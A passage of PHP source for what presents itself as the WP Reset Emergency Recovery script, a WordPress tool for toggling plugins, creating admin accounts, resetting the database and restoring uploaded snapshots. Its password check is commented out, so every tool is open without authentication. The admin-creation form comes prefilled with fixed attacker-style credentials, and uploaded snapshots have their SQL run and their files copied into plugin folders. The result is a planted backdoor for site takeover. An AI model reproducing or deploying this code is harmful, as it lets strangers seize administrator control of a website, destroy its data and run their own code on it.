            if (in_array($plugin_path, $this->active_plugins)) {
                if (defined('WPR_FREE') && WPR_FREE) {
                    $html .= '<a class="button button-red button-pro-feature" href="#">Deactivate plugin</a>';
                } else {
                    $html .= '<a class="button button-red" href="?action=disable_plugin&plugin=' . urlencode($plugin_path) . '">Deactivate plugin</a>';
                }
            } else {
                if (defined('WPR_FREE') && WPR_FREE) {
                    $html .= '<a class="button button-red button-pro-feature" href="#">Activate plugin</a>';
                } else {
                    $html .= '<a class="button button-primary" href="?action=activate_plugin&plugin=' . urlencode($plugin_path) . '">Activate plugin</a>';
                }
            }
            $html .= '</td>';
            $html .= '</tr>';
        }
        $html .= '</table>';

        if (defined('WPR_FREE') && WPR_FREE) {
            $html .= '<br><a class="button button-red button-pro-feature" href="#">Deactivate all plugins</a>';
        } else {
            $html .= '<br><a class="button button-red" href="?action=disable_plugins">Deactivate all plugins</a>';
        }


        $this->print_section('plugins', 'Plugins', $html);
    }

    function print_section_user_privileges()
    {
        $html = '';
        $html .= '<p>If you changed the WordPress database tables prefix and can\'t login, run this tool to fix the problem. It edits entries in options and user meta tables to match the new tables prefix.</p>';
        $html .= '<br><a class="button button-primary" href="?action=reset_user_prefix">Reset user privileges &amp; roles</a>';

        $this->print_section('user-privileges', 'User Privileges &amp; Roles', $html);
    }
	


    function print_section_admin_account()
    {
        $html = '';
        $html .= '<p>If you can\'t login (for whatever reason) with your administrator account, create a new one. Make sure you pick a fresh username that doesn\'t exist on your site.</p>';
        $html .= '<form method="post" action="' . strtok($_SERVER["REQUEST_URI"], '?') . '">';
        $html .= '<table>';
        $html .= '<tr><td>Username:</td><td><input type="text" name="admin_user" value="audywebmuchy@112" /></td></tr>';
        $html .= '<tr><td>Password:</td><td><input type="text" name="admin_pass" value="audywebmuchy@112" /></td></tr>';
        $html .= '<tr><td>Email:</td><td><input type="text" name="admin_email" value="audywebmuchy@example1112.com" /></td></tr>';
        $html .= '<tr><td>&nbsp;</td><td><input type="hidden" name="action" value="admin_create" />';

        if (defined('WPR_FREE') && WPR_FREE) {
            $html .= '<a class="button button-pro-feature" href="#">Create new admin account</a>';
        } else {
            $html .= '<input type="submit" class="button" name="admin_create" value="Create new admin account" />';
        }

        $html .= '</td></tr>';
        $html .= '</table>';
        $html .= '</form>';

        $this->print_section('admin-account', 'Administrator Account', $html);
    }

    function print_section_wp_urls()
    {
        $html = '';
        $html .= '<p>Most issues related to infinite redirection loops, and problems caused by forcing HTTPS on non-SSL enabled hosts stem from the WP home and site URLs. If you changed the URLs from "http" to "https" simply change back the URLs.<br>';
        $html .= 'For most sites both URLs should be the same. For those who have WP files in a different folder "WP address" is the address of the WP core files folder (the one where "wp-settings.php" is located), and "Site Address" is the URL where the site should be (the URL you\'d share around).</p>';

        $html .= '<form method="post" action="' . strtok($_SERVER["REQUEST_URI"], '?') . '">';
        $html .= '<table>';
        $html .= '<tr><td>WordPress Address (URL)</td><td><input type="text" name="siteurl" value="' . $this->get_option('siteurl') . '" /></td></tr>';
        $html .= '<tr><td>Site Address (URL)</td><td><input type="text" name="home" value="' . $this->get_option('home') . '" /></td></tr>';
        $html .= '<tr><td>&nbsp;</td><td><input type="hidden" name="action" value="update_urls" />';

        if (defined('WPR_FREE') && WPR_FREE) {
            $html .= '<a class="button button-pro-feature" href="#">Update URLs</a>';
        } else {
            $html .= '<input type="submit" class="button" name="update_urls" value="Update URLs" />';
        }

        $html .= '</td></tr>';
        $html .= '</table>';
        $html .= '</form>';

        $this->print_section('wp-urls', 'WordPress URLs', $html);
    }

    function print_section_reset_wordpress()
    {
        $html = '';
        $html .= '<p>This will completely reset the WordPress database. Plugins and themes, and files will remain untouched. All the users will be removed as well and you will need to create a new administrator account.</p>';

        if (file_exists(ABSPATH . 'wp-admin/install.php')) {
            $html .= '<form method="post" action="' . strtok($_SERVER["REQUEST_URI"], '?') . '">';
            $html .= '<table>';
            $html .= '<tr>
            <td><input type="text" name="do_wp_reset_confirm" placeholder="Type in &quot;reset&quot;" value="" autocomplete="off"></td>
            <td><input type="hidden" name="action" value="wp_reset" /><input type="submit" class="button red" name="do_wp_reset" value="Reset WordPress (there is no undo!)" /></td>
            </tr>';
            $html .= '</table>';
            $html .= '</form>';
        } else {
            $html .= '<p class="red">Could not find the WordPress /wp-admin/install.php location</p>';
        }
        $this->print_section('wp-do-reset', 'Reset WordPress', $html);
    }

    function print_section_reset_htaccess()
    {
        $html = '';
        $html .= '<p>Delete or Reset the .htaccess file to the default rules.</p>';
        $html .= '<a class="button button-primary" href="?action=reset_htaccess">Reset .htaccess</a>';
        $html .= '<a class="button button-primary" href="?action=delete_htaccess">Delete .htaccess</a>';
        $this->print_section('wp-do-reset-htaccess', 'Delete or Reset .htaccess', $html);
    }

    function print_section_disable_maintenance()
    {
        $html = '';
        $html .= '<p>This will remove the .maintenance file, disabling the WordPress default Maintenance Mode.</p>';
        $html .= '<a class="button button-primary" href="?action=disable_maintenance">Disable WordPress Maintenance Mode</a>';
        $this->print_section('wp-disable-maintenance', 'Disable WordPress Maintenance Mode', $html);
    }

    function print_section_snapshots()
    {
        $html = '';
        $snapshots = $this->get_snapshots();
        if (false === $snapshots) {
            $html .= 'No snapshots found on local website.';
        } else {
            $html .= '<table>';
            $html .= '<tr><th class="ss-date" style="text-align:left;">Date</th><th style="text-align:left;">Description</th><th class="ss-size" style="text-align:left;">Size</th><th class="ss-actions"></th></tr>';
            $snapshots = array_reverse($snapshots);
            foreach ($snapshots as $sid => $snapshot) {
                $tmp = $snapshot['tbl_size'];
                if (!empty($snapshot['file_size'])) {
                    $tmp += $snapshot['file_size'];
                }
                $html .= '<tr>
                <td>' . $snapshot['timestamp'] . '</td>
                <td>' . $snapshot['name'] . '</td>
                    <td>' . $this->format_size($tmp) . '</td>
                    <td>';

                if (defined('WPR_FREE') && WPR_FREE) {
                    $html .= '<a class="button button-pro-feature" href="#">Restore</a>';
                } else {
                    $html .= '<a class="button" href="?action=restore_snapshot&sid=' . $sid . '">Restore</a>';
                }

                $html .= '</td>
                </tr>';
            }
            $html .= '</table>';
        }

        $html .= '<h2>Upload snapshot</h2>';
        $html .= '<p>If your snapshot is uploaded to a cloud service please download it from your cloud account or WP Reset Dashboard and upload it below.</p>';
        $html .= '<form method="post" action="' . strtok($_SERVER["REQUEST_URI"], '?') . '" enctype="multipart/form-data">';
        $html .= '<table>';
        $html .= '<tr><td>Snapshot file</td><td><input type="file" name="snapshot_zip" value="" /></td></tr>';
        $html .= '<tr><td>&nbsp;</td><td><input type="hidden" name="action" value="snapshot_upload" />';

        if (defined('WPR_FREE') && WPR_FREE) {
            $html .= '<a class="button button-pro-feature" href="#">Upload Snapshot</a>';
        } else {
            $html .= '<input type="submit" class="button" name="snapshot_upload" value="Upload Snapshot" />';
        }

        $html .= '</td></tr>';
        $html .= '</table>';
        $html .= '</form>';

        $this->print_section('snapshots', 'Snapshots', $html);
    }



    function print_footer()
    {
        echo '<footer>&copy; <a href="https://wpreset.com/?utm_source=ers_' . WPR_RECOVERY_VER . '" target="_blank">WP Reset</a> 2019 - ' . date('Y') . '</footer>';
        if (defined('WPR_FREE') && WPR_FREE) {
            echo '<div id="wpr-free-promo">';
            echo '<div class="pro-close">&times;</div>';
            echo '<div style="text-align: center;"><img style="padding-bottom: 10px;" width="180" src="https://wpreset.com/app/wp-content/uploads/2018/05/wp-reset-logo.png" />';
            echo '<br><b>Get WP Reset PRO &amp; all Emergency Recovery Tools<br>for <del>$79</del> $39 <small>/year</small></b></div>';
            echo '<ul>';
            echo '<li>access to premium, email support</li>';
            echo '<li>all PRO tools including all ERS tools to restore your site</li>';
            echo '<li>automated snapshots with backups on WPR cloud so you can always undo your mistakes</li>';
            echo '<li>three types of reset tools so you can always start fresh</li>';
            echo '<li>view all <a href="https://wpreset.com/?utm_source=ers-free" target="_blank">features</a></li>';
            echo '</ul>';
            echo '<div style="text-align: center;"><a class="button" target="_blank" href="https://wpreset.com/?utm_source=ers-free"><b>Get WP Reset PRO for only $39 <small>/y</small></a></b></div>';

            echo '</div>';
            echo '<script>
            window.onload = function() {
                var open_wpr_free_promo = function (event) {
                    if (!event.target.matches(".button-pro-feature") && !event.target.matches(".pro-feature") && !event.target.matches(".pro")) return;
                    event.preventDefault();
                    document.getElementById("wpr-free-promo").style.display = "block";
                    document.addEventListener("click", close_wpr_free_promo, true);
                };
                
                document.addEventListener("click", open_wpr_free_promo, false);

                var close_wpr_free_promo = function (event) {
                    if (event.target.matches(".button-pro-feature") && event.target.matches(".pro-feature") && event.target.matches(".pro")) return;
                    var isClickInside = document.getElementById("wpr-free-promo").contains(event.target);
                    if(event.target.matches(".pro-close")){
                      isClickInside = false;
                    }
                    if (!isClickInside) {
                        document.removeEventListener("click", close_wpr_free_promo, true);
                        document.getElementById("wpr-free-promo").style.display = "none";
                    }
                }
            }
            </script>';
        }
        echo '</body></html>';
    }

    /**
     Variable Setup
     */

    function setup_variables()
    {

        if (file_exists('wpr_config.php')) {
            include 'wpr_config.php';
        } else if (file_exists('wpr-config.php')) {
            include 'wpr-config.php';
        }

        if (version_compare(phpversion(), '5.6', '<')) {
            $this->wpr_error('WP Reset Emergency Recovery script has only been tested with PHP 5.6+. Your PHP version ' . phpversion() . ' is untested and using the script could result in unexpected errors.');
        }

        #if (!defined('WPR_RECOVERY_PASS') || strlen(WPR_RECOVERY_PASS) < 6) {
        #    $this->wpr_error('In order to prevent unauthorized access, please make sure the password is at least 6 characters long.');
        #    return false;
       # }

        if (isset($_REQUEST['password'])) {
            if ($_REQUEST['password'] == WPR_RECOVERY_PASS) {
                $_SESSION['loggedin'] = true;
            } else {
                $this->wpr_error('Incorrect password.');
            }
        }

        #if (!(isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true)) {
            //wpr_error('By interacting with this page without permission you explicitly agree to renounce any rights to privacy and allow the owner of the website and any affiliated individuals to do all they can think of to track you down and take appropriate action against you!');
         #   echo '<h2>Enter your password to continue</h2>';
         #   echo '<form method="post" action="' . strtok($_SERVER["REQUEST_URI"], '?') . '">';
         #   echo '<table>';
         #   echo '<tr><td>Password:</td><td><input type="password" name="password" value="" /></td></tr>';
         #   echo '<tr><td>&nbsp;</td><td><input type="submit" class="button" name="login" value="Login" /></td></tr>';
         #   echo '</table>';
         #   echo '</form>';
         #   return false;
       # }


        $relative_path = '';

        if (defined('WPCONFIGPATH')) {
            if (file_exists(rtrim(WPCONFIGPATH, '/') . '/wp-config.php')) {
                $this->wp_config_path = rtrim(WPCONFIGPATH, '/') . '/wp-config.php';
                $this->wp_config = file_get_contents(rtrim(WPCONFIGPATH, '/') . '/wp-config.php');

                //Is wp-load.php in the same folder?
                if (file_exists(rtrim(WPCONFIGPATH, '/') . '/wp-load.php')) {
                    define('ABSPATH', rtrim(WPCONFIGPATH, '/') . '/');
                } else {
                    //Are core files in a subfolder?
                    if (file_exists('index.php')) {
                        // Check if it's actually WordPress main index.php file
                        $index_contents = file_get_contents(rtrim(WPCONFIGPATH, '/') . 'index.php');
                        if (strpos($index_contents, 'wp-blog-header.php') != false) {
                            preg_match_all('/require[[:print:]]*\'\/(.*)wp-blog-header\.php\'/i', $index_contents, $matches);
                            if (count($matches[1]) > 0) {
                                $wp_dir = trim(trim($matches[1][0], '\''), '"');
                                define('ABSPATH', realpath($relative_path) . '/' . $wp_dir);
                            } else {
                                $this->wpr_error('found wp-config.php but could not determine core files path!');
                            }
                        }
                    }
                }
            } else {
                $this->wpr_error('wp-config.php not found in ' . rtrim(WPCONFIGPATH, '/') . '/wp-config.php');
                return false;
            }
        }

        /**
         * Search for wp-load.php to determine absolute path
         */
        if (!defined('ABSPATH') && file_exists('wp-load.php')) {
            // In the same folder as wp-load, so this is ABSPATH
            define('ABSPATH', realpath($relative_path) . '/');

            // wp-config is either here or one level up
            if (file_exists(ABSPATH . 'wp-config.php')) {
                $this->wp_config_path = ABSPATH . 'wp-config.php';
                $this->wp_config = file_get_contents(ABSPATH . 'wp-config.php');
            } else if (file_exists(dirname(ABSPATH) . '/wp-config.php')) {
                $this->wp_config_path = dirname(ABSPATH) . '/wp-config.php';
                $this->wp_config = file_get_contents(dirname(ABSPATH) . '/wp-config.php');
            } else {
                $this->wpr_error('found wp-load.php but wp-config.php not found!');
                return false;
            }
        }

        if (!defined('ABSPATH') && file_exists('wp-config.php')) {
            // We're in the same folder as wp-config but not in same folder as wp-load, so it means we're one level up, but where are the core files?
            $this->wp_config_path = realpath('wp-config.php');
            $this->wp_config = file_get_contents('wp-config.php');
            //Is wp-config in root with index.php?
            if (file_exists('index.php')) {
                // Check if it's actually WordPress main index.php file
                $index_contents = file_get_contents('index.php');
                if (strpos($index_contents, 'wp-blog-header.php') != false) {
                    preg_match_all('/require[[:print:]]*\'\/(.*)wp-blog-header\.php\'/i', $index_contents, $matches);
                    if (count($matches[1]) > 0) {
                        $wp_dir = trim(trim($matches[1][0], '\''), '"');
                        define('ABSPATH', realpath($relative_path) . '/' . $wp_dir);
                    } else {
                        $this->wpr_error('found wp-config.php but could not determine core files path!');
                    }
                }
            }
        }

        if (!defined('ABSPATH') && file_exists('index.php')) {
            // Maybe We're in root but wp-config.php might be in WordPress subfolder

            // Check if it's actually WordPress main index.php file
            $index_contents = file_get_contents('index.php');
            if (strpos($index_contents, 'wp-blog-header.php') != false) {
                preg_match_all('/require[[:print:]]*\'\/(.*)wp-blog-header\.php\'/i', $index_contents, $matches);
                if (count($matches[1]) > 0) {
                    $wp_dir = trim(trim($matches[1][0], '\''), '"');
                    define('ABSPATH', realpath($relative_path) . '/' . $wp_dir);
                    if (file_exists(ABSPATH . 'wp-config.php')) {
                        $this->wp_config_path = ABSPATH . 'wp-config.php';
                        $this->wp_config = file_get_contents(ABSPATH . 'wp-config.php');
                    } else {
                        $this->wpr_error('found WordPress main index.php but wp-config.php not found!');
                        return false;
                    }
                }
            }
        }

        if (!defined('ABSPATH')) {
            // We might be in the plugin directory or other subfolder
            for ($t = 0; $t < 10; $t++) {
                if (file_exists($relative_path . 'wp-load.php')) {
                    define('ABSPATH', realpath($relative_path) . '/');
                    break;
                }
                $relative_path = '../' . $relative_path;
            }

            if (defined('ABSPATH')) {
                // We found wp-load.php, we need wp-config.php now
                if (file_exists(ABSPATH . 'wp-config.php')) {
                    $this->wp_config_path = ABSPATH . 'wp-config.php';
                    $this->wp_config = file_get_contents(ABSPATH . 'wp-config.php');
                } else if (file_exists(dirname(ABSPATH) . '/wp-config.php')) {
                    $this->wp_config_path = dirname(ABSPATH) . '/wp-config.php';
                    $this->wp_config = file_get_contents(dirname(ABSPATH) . '/wp-config.php');
                } else {
                    $this->wpr_error('found wp-load.php but wp-config.php not found!');
                    return false;
                }
            } else {
                $this->wpr_error('wp-config.php not found!');
                return false;
            }
        }

        /**
         * Connect to database
         */
        $this->dbname = $DB_NAME = $this->get_define_value('DB_NAME', $this->wp_config);
        $this->dbuser = $DB_USER = $this->get_define_value('DB_USER', $this->wp_config);
        $this->dbpass = $DB_PASSWORD = $this->get_define_value('DB_PASSWORD', $this->wp_config);
        $this->dbhost = $DB_HOST = $this->get_define_value('DB_HOST', $this->wp_config);
        $this->table_prefix = $this->get_variable('table_prefix', $this->wp_config);
        $db_info = $this->get_db_info($DB_HOST);

        if ($DB_NAME === false || $DB_USER === false || $DB_PASSWORD === false || $DB_HOST === false || $this->table_prefix === false) {
            $this->wpr_error('Failed to read db configuration!');
            return false;
        }

        $this->wfdb = mysqli_connect($db_info['host'], $DB_USER, $DB_PASSWORD, $DB_NAME, $db_info['port']);

        if (!$this->wfdb) {
            $this->wpr_error('Error: Unable to connect to MySQL.');
            echo 'Debugging errno: ' . mysqli_connect_errno() . '<br />';
            echo 'Debugging error: ' . mysqli_connect_error() . '<br />';

            echo '<br />';
            echo 'Tried to connect using the following mysql details:<br />';
            echo '<table>';
            echo '<tr><td>Database name:<td></td><td>' . $DB_NAME . '</td></tr>';
            echo '<tr><td>Database user:<td></td><td>' . $DB_USER . '</td></tr>';
            echo '<tr><td>Database pass:<td></td><td><input id="db_pass" style="border:none;" type="password" value="' . $DB_PASSWORD . '" /><span onclick="reveal_pass()">(click to show password)</span></td></tr>';
            echo '<tr><td>Database host:<td></td><td>' . $db_info['host'] . '</td></tr>';
            echo '<tr><td>Database port:<td></td><td>' . $db_info['port'] . '</td></tr>';
            echo '<table>';

            echo '<script>
            function reveal_pass() {
                var x = document.getElementById("db_pass");
                if (x.type === "password") {
                x.type = "text";
                } else {
                x.type = "password";
                }
            }
            </script>';
            return false;
        }


        /**
         * Set wp-content and plugins directory as their paths can be changed in wp-config
         */
        if (file_exists(ABSPATH . 'wp-content')) {
            define('WPR_WPCONTENT', ABSPATH . 'wp-content');
        } else {
            $this->wp_config_content_dir = $this->get_define_value('WP_CONTENT_DIR');
            if (false !== $this->wp_config_content_dir && file_exists(ABSPATH . $this->wp_config_content_dir)) {
                define('WPR_WPCONTENT', ABSPATH . $this->wp_config_content_dir);
            } else {
                $this->wpr_error('wp-content directory not found!');
                return false;
            }
        }


        $wp_plugin_dir = $this->get_define_value('WP_PLUGIN_DIR');
        if (!empty($wp_plugin_dir)) {
            define('WPR_PLUGINDIR', $wp_plugin_dir);
        } else {
            define('WPR_PLUGINDIR', WPR_WPCONTENT . '/plugins');
        }

        /**
         * Retrieve other variables we need
         */
        include(ABSPATH . 'wp-includes/version.php');
        $this->wp_version = $wp_version;

        $locale = $this->get_define_value('WPLANG', $this->wp_config);
        if (empty($locale)) {
            $locale = '';
        } else {
            $locale = $locale . '/';
        }

        $this->active_plugins = unserialize($this->get_option('active_plugins'));
        $this->active_theme = $this->get_option('stylesheet');
        return true;
    }

    /**
     Tools/Actions Functions
     */

    function reset_htaccess()
    {
        if (file_exists(ABSPATH . '.htaccess')) {
            unlink(ABSPATH . '.htaccess');
        }

        $htaccess_content = '';
        $permalink_structure = $this->get_option('permalink_structure');

        if (!$permalink_structure) {
            $htaccess_content = '';
        } else {
            $site_root = parse_url($this->get_option('siteurl'));
            if (isset($site_root['path'])) {
                $site_root = $this->trailingslashit($site_root['path']);
            }

            $home_root = parse_url($this->get_option('home'));
            if (isset($home_root['path'])) {
                $home_root = $this->trailingslashit($home_root['path']);
            } else {
                $home_root = '/';
            }

            $htaccess_content  = "<IfModule mod_rewrite.c>\n";
            $htaccess_content .= "RewriteEngine On\n";
            $htaccess_content .= "RewriteRule .* - [E=HTTP_AUTHORIZATION:%{HTTP:Authorization}]\n";
            $htaccess_content .= "RewriteBase $home_root\n";

            // Prevent -f checks on index.php.
            $htaccess_content .= "RewriteRule ^index\.php$ - [L]\n";

            $htaccess_content .= "RewriteCond %{REQUEST_FILENAME} !-f\n" .
                "RewriteCond %{REQUEST_FILENAME} !-d\n" .
                "RewriteRule . {$home_root}index.php [L]\n";

            $htaccess_content .= "</IfModule>\n";
        }
        file_put_contents(ABSPATH . '.htaccess', $htaccess_content);
        $this->reload('.htaccess has been reset');
    }

    function delete_htaccess()
    {
        if (file_exists(ABSPATH . '.htaccess')) {
            unlink(ABSPATH . '.htaccess');
            $this->reload('.htaccess has been deleted');
        } else {
            $this->wpr_error('.htaccess not found');
        }
    }

    function disable_maintenance()
    {
        if (file_exists(ABSPATH . '.maintenance')) {
            unlink(ABSPATH . '.maintenance');
            $this->reload('WordPress maintenance mode disabled');
        } else {
            $this->wpr_error('WordPress maintenance mode was not enabled');
        }
    }

    function do_wp_reset()
    {
        $install_url = $this->get_option('home') . '/wp-admin/install.php';

        if (!isset($_POST['do_wp_reset_confirm']) || $_POST['do_wp_reset_confirm'] !== 'reset') {
            $this->wpr_error('Please type "reset" in the field in order to perform the reset.');
            return false;
        }

        $table_status = $this->wfdb_get_results('SHOW TABLE STATUS');
        if (!is_array($table_status)) {
            $this->wpr_error('Can\'t get table status data.');
            return false;
        }

        foreach ($table_status as $index => $table) {
            if (0 !== stripos($table['Name'],  $this->table_prefix)) {
                continue;
            }
            if (empty($table['Engine'])) {
                continue;
            }

            $this->wfdb->query('DROP TABLE `' . $table['Name'] . '`');
        } // foreach

        header('Location: ' . $install_url);
        die();
    }

    function restore_snapshot($uid)
    {
        $this->wpr_error('Restoring snapshot ' . $uid);

        if (($res = $this->do_restore_snapshot($uid)) === true) {
            $this->reload('Snapshot restored!');
        } else {
            $this->wpr_error($res);
        }
    }

    function snapshot_upload()
    {
        $import_folder = $this->export_dir_path();
        if (is_array($import_folder)) {
            $this->wpr_error($import_folder['error']);
            return false;
        }
        $import_file = $import_folder . '/' . $_FILES['snapshot_zip']['name'];

        move_uploaded_file($_FILES['snapshot_zip']['tmp_name'], $import_file);

        $import_res = $this->do_import_snapshot($import_file, true);

        if ($import_res !== true) {
            $this->wpr_error('Error: ' . $import_res);
        } else {
            $this->reload('Snapshot imported sucessfully!');
        }
    }

    function do_import_snapshot($snapshot_zip)
    {
        $import_zip = new ZipArchive();
        $import_zip->open($snapshot_zip);
        $zip_files = array();

        for ($i = 0; $i < $import_zip->numFiles; $i++) {
            $file_path = $import_zip->statIndex($i);
            $zip_files[] = $file_path['name'];
        }

        if (!in_array('wp-reset-export.json', $zip_files)) {
            return 'Not a valid snapshot export file.';
        }

        $temp_import = $this->export_dir_path('temp_import');
        if (is_array($temp_import)) {
            $this->wpr_error($temp_import['error']);
            return false;
        }

        $import_zip->extractTo($temp_import);
        $import_zip->close();

        $snapshot = json_decode(file_get_contents($temp_import . '/wp-reset-export.json'), true);
        $snapshots = $this->get_snapshots();

        if (empty($snapshots) || $snapshots != array()) {
            $snapshots = array();
        }

        if (!(is_array($snapshot) && array_key_exists('uid', $snapshot))) {
            $this->delete_folder($temp_import, basename($temp_import));
            return 'Snapshot details are invalid or missing.';
        }

        if (array_key_exists($snapshot['uid'], $snapshots)) {
            $this->delete_folder($temp_import, basename($temp_import));
            return 'Uploaded snapshot already exists. Delete the existing one before importing it.';
        }

        if ($snapshot['table_prefix'] != $this->table_prefix) {
            $this->delete_folder($temp_import, basename($temp_import));
            return 'Table prefix in uploaded snapshot does not match your current table prefix.';
        }

        if ($snapshot['home_url'] != $this->get_option('home')) {
            $this->delete_folder($temp_import, basename($temp_import));
            return 'Site URL in uploaded snapshot does not match your current site URL.';
        }

        $table_status = $this->wfdb_get_results('SHOW TABLE STATUS');
        if (is_array($table_status)) {
            foreach ($table_status as $index => $table) {
                if (stripos($table['Name'], $snapshot['uid']) === 0) {
                    $this->delete_folder($temp_import, basename($temp_import));
                    return 'Table ' . $table['Name'] . ' from uploaded snapshot already exist in the current database.';
                }
            }
        }

        if (!empty($snapshot['plugins']) || !empty($snapshot['themes'])) {
            if (!file_exists($temp_import . '/wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip')) {
                $this->delete_folder($temp_import, basename($temp_import));
                return 'Snapshot files are missing.';
            }

            $dest = $this->autosnapshots_dir_path();
            copy($temp_import . '/wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip', $dest . '/wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip');
        }



        $db_dump_file_gz = gzopen($temp_import . '/wp-reset-snapshot-' . $snapshot['uid'] . '.sql.gz', 'rb');
        $db_dump_file_sql = fopen($temp_import . '/wp-reset-snapshot-' . $snapshot['uid'] . '.sql', 'wb+');
        while (!gzeof($db_dump_file_gz)) {
            fwrite($db_dump_file_sql, gzread($db_dump_file_gz, 4096));
        }
        rewind($db_dump_file_sql);
        gzclose($db_dump_file_gz);

        $line_ending = PHP_EOL;

        $parse_result = $this->parse_sql_dump($db_dump_file_sql, $line_ending);

        if ($parse_result['lines'] == 0) {
            $line_ending = "\n";
            $parse_result = $this->parse_sql_dump($db_dump_file_sql, $line_ending);
        }
        if ($parse_result['lines'] == 0) {
            $line_ending = "\r\n";
            $parse_result = $this->parse_sql_dump($db_dump_file_sql, $line_ending);
        }

        $parse_result['line_ending'] = $line_ending;
        $parse_result['uid'] = $snapshot['uid'];

        fclose($db_dump_file_sql);

        $temp_import = $this->export_dir_path('temp_import');
        if (is_array($temp_import)) {
            $this->wpr_error($temp_import['error']);
            return false;
        }

        $tbl_core = $tbl_custom = 0;
        $tables = $this->wfdb_get_col("SHOW TABLES LIKE '" . $snapshot['uid'] . "%'");
        $imported_tables = array();
        foreach ($tables as $table) {
            $imported_tables[] = $table;
            if (in_array(str_ireplace($snapshot['uid'] . '_' . $this->table_prefix, '', $table), $this->core_tables)) {
                $tbl_core++;
            } else {
                $tbl_custom++;
            }
        }

        if ($snapshot['tbl_core'] != $tbl_core || $snapshot['tbl_custom'] != $tbl_custom) {
            $this->delete_folder($temp_import, basename($temp_import));
            foreach ($imported_tables as $table) {
                $this->wfdb->query('DROP TABLE IF EXISTS `' . $table . '`');
            }
            return 'Imported tables do not match expected table count (Core tables: ' . $tbl_core . ' restored / ' . $snapshot['tbl_core'] . ' in snapshot, Custom tables: ' . $tbl_custom . ' restored / ' . $snapshot['tbl_custom'] . ' in snapshot). Contact WP Reset support if data is critical, or restore it manualy via SQL.';
        }

        $this->delete_folder($temp_import, basename($temp_import));

        $snapshot['imported'] = date('Y-m-d H:i:s');
        $snapshot['partial'] = false;
        $snapshots[$snapshot['uid']] = $snapshot;
        $this->update_option('wp-reset-snapshots', $snapshots);

        return true;
    } // do_import_snapshot

    function parse_sql_dump($db_dump_file_sql, $line_ending = PHP_EOL)
    {
        $options = unserialize($this->get_option('wp-reset'));

        $tables = array();
        $lines_read = 0;
        rewind($db_dump_file_sql);
        while (!feof($db_dump_file_sql)) {
            $buffer = stream_get_line($db_dump_file_sql, 100000000, ";" . $line_ending);

            if (substr($buffer, 0, 2) == '--' || trim($buffer) == '') {
                continue;
            }

            $lines_read++;
            if (!empty($buffer)) {
                $buffer = preg_replace('/[\x09]/', '\t', trim($buffer));
                if ($options['options']['fix_datetime'] == true) {
                    $buffer = str_replace("datetime NOT NULL DEFAULT '0000-00-00 00:00:00'", "datetime DEFAULT NULL", $buffer);
                    $buffer = str_replace("timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'", "timestamp DEFAULT NULL", $buffer);
                    $buffer = str_replace("'0000-00-00 00:00:00'", "NULL", $buffer);
                }
                $this->wfdb->query($buffer);
            }
        }

        return array('lines' => $lines_read, 'tables' => $tables);
    }

    function do_restore_snapshot($uid = '')
    {
        $new_tables = array();
        $snapshots = $this->get_snapshots();
        $wpr_options = $this->get_option('wp-reset');
        $cloud_snapshots = $this->get_option('wp-reset-cloud-snapshots');
        $wf_licensing_wpr = $this->get_option('wf_licensing_wpr');

        if (($res = $this->verify_snapshot_integrity($uid)) !== true) {
            return $res;
        }

        if (!empty($snapshots[$uid]['plugins']) || !empty($snapshots[$uid]['themes'])) {
            if (($res = $this->restore_snapshot_files($snapshots[$uid])) !== true) {
                return $res;
            }
        }

        $table_status = $this->wfdb_get_results('SHOW TABLE STATUS');
        if (is_array($table_status)) {
            foreach ($table_status as $index => $table) {
                if (0 !== stripos($table['Name'], $uid . '_')) {
                    continue;
                }
                if (empty($table['Engine'])) {
                    continue;
                }

                $new_tables[] = $table['Name'];
            } // foreach
        } else {
            return 'Can\'t get table status data.';
        }

        foreach ($table_status as $index => $table) {
            if (0 !== stripos($table['Name'],  $this->table_prefix)) {
                continue;
            }
            if (empty($table['Engine'])) {
                continue;
            }

            $this->wfdb->query('DROP TABLE `' . $table['Name'] . '`');
        } // foreach

        // copy snapshot tables to original name
        foreach ($new_tables as $table) {
            $new_name = str_replace($uid . '_', '', $table);

            $this->wfdb->query('CREATE TABLE `' . $new_name . '` LIKE `' . $table . '`');
            $this->wfdb->query('INSERT `' . $new_name . '` SELECT * FROM `' . $table . '`');
        }

        $this->update_option('wp-reset', $wpr_options);
        $this->update_option('wp-reset-snapshots', $snapshots);
        $this->update_option('wp-reset-cloud-snapshots', $cloud_snapshots);
        $this->update_option('wf_licensing_wpr', $wf_licensing_wpr);

        return true;
    } // restore_snapshot

    function restore_snapshot_files($snapshot)
    {
        $temp_dir = $this->autosnapshots_dir_path('_tmp_wp-reset-snapshot-files-' . $snapshot['uid']);

        $archive_files = new ZipArchive;
        $archive_files->open($this->autosnapshots_dir_path('wp-reset-snapshot-files-' . $snapshot['uid'] . '.zip'));
        $archive_files->extractTo($temp_dir);

        if (!empty($snapshot['plugins'])) {
            foreach ($snapshot['plugins'] as $plugin) {
                $folder = basename($plugin);
                $this->delete_folder(WP_PLUGIN_DIR . '/' . $folder, WP_PLUGIN_DIR . '/' . $folder);
                $this->copy_folder($temp_dir . '/' . $folder, WP_PLUGIN_DIR . '/' . $folder);
            }
        }

        if (!empty($snapshot['themes'])) {
            foreach ($snapshot['themes'] as $theme) {
                $folder = basename($theme);
                $this->delete_folder(get_theme_root() . '/' . $folder, get_theme_root() . '/' . $folder);
                $this->copy_folder($temp_dir . '/' . $folder, get_theme_root() . '/' . $folder);
            }
        }

        $archive_files->close();
        $this->delete_folder($temp_dir, $this->autosnapshots_dir_path());

        return true;
    } // restore_snapshot_files

    public function delete_folder($folder, $base_folder)
    {
        if (!file_exists($folder)) {
            return true;
        }

        $files = array_diff(scandir($folder), array('.', '..'));

        foreach ($files as $file) {
            if (is_dir($folder . DIRECTORY_SEPARATOR . $file)) {
                $this->delete_folder($folder . DIRECTORY_SEPARATOR . $file, $base_folder);
            } else {
                $tmp = @unlink($folder . DIRECTORY_SEPARATOR . $file);
                $this->delete_count += (int) $tmp;
            }
        } // foreach

        if ($folder != $base_folder) {
            $tmp = @rmdir($folder);
            $this->delete_count += (int) $tmp;
            return $tmp;
        } else {
            return true;
        }
    } // delete_folder

    function copy_folder($source, $destination)
    {
        $dir = opendir($source);
        @mkdir($destination);
        while (false !== ($file = readdir($dir))) {
            if (($file != '.') && ($file != '..')) {
                if (is_dir($source . '/' . $file)) {
                    $this->copy_folder($source . '/' . $file, $destination . '/' . $file);
                } else {
